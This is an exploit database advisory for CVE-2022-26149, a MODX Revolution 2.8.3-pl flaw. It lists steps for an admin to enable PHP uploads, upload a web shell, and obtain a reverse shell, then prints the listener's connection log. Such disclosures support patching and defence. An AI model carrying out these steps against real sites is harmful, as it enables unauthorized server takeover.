---
title: Remote Code Execution in MODX Revolution V2.8.3-pl
url: https://cxsecurity.com/issue/WLB-2022110023
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2022-11-16
fetch_date: 2025-10-03T22:50:49.284421
---

# Remote Code Execution in MODX Revolution V2.8.3-pl

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Remote Code Execution in MODX Revolution V2.8.3-pl** **2022.11.15**  **![us](https://cert.cx/cxstatic/images/flags/us.png) [Sarang Tumne](https://cxsecurity.com/author/Sarang%2BTumne/1/) **(US)** ![us](https://cert.cx/cxstatic/images/flags/us.png)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2022-26149](https://cxsecurity.com/cveshow/CVE-2022-26149/ "Click to see CVE-2022-26149")**  CWE: **N/A**  **[**Dork:** MODX Exploit](https://cxsecurity.com/dorks/)** | |

# Exploit Title: Authenticated Remote Code Execution in MODX Revolution V2.8.3-pl
# Remote Code Execution in MODX Revolution V2.8.3-pl and earlier allows remote attackers to execute arbitrary code via uploading a php web shell.
# Exploit Author: Sarang Tumne @CyberInsane (Twitter: @thecyberinsane) #HTB profile: https://www.hackthebox.com/home/users/profile/2718
# Date: 26th Feb'2022
# CVE ID: CVE-2022-26149
# Confirmed on release 2.8.3-pl
# Vendor: https://modx.com/download
###############################################
#Step1- Login with Admin Credentials
#Step2- Uploading .php files is disabled by default hence we need to abuse the functionality:
Add the php file extension under the "Uploadable File Types" option available in "System Settings"
#Step3- Now Goto Media=>Media Browser and upload the Shell.php
#Step4- Now visit http://IP\_Address/Shell.php and get the reverse shell:
listening on [any] 4477 ...
connect to [192.168.56.1] from (UNKNOWN) [192.168.56.130] 58056
bash: cannot set terminal process group (1445): Inappropriate ioctl for device
bash: no job control in this shell
daemon@debian:/opt/bitnami/modx$

**##### References:**

https://github.com/sartlabs/0days/blob/main/Modx/Exploit.txt

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2022110023)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top